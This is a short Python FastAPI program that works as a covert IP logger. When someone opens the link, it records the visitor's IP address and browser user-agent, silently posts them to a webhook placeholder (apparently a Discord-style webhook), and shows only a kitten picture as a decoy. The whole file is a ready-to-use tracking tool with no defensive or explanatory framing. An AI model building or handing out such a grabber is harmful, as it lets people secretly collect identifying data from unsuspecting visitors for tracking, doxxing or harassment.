from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

WEBHOOK = "YOUR_WEBHOOK"

def get_ip(request: Request):
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0]
    return request.client.host

@app.get("/")
async def root(request: Request):
    ip = get_ip(request)
    useragent = request.headers.get("user-agent")

    try:
        requests.post(WEBHOOK, json={
            "content": f"IP: {ip}\nUA: {useragent}"
        })
    except:
        pass

    return HTMLResponse("""
    <html>
    <body style="margin:0">
        <img src="https://placekitten.com/800/600" style="width:100%;height:100%;object-fit:contain;">
    </body>
    </html>
    """)
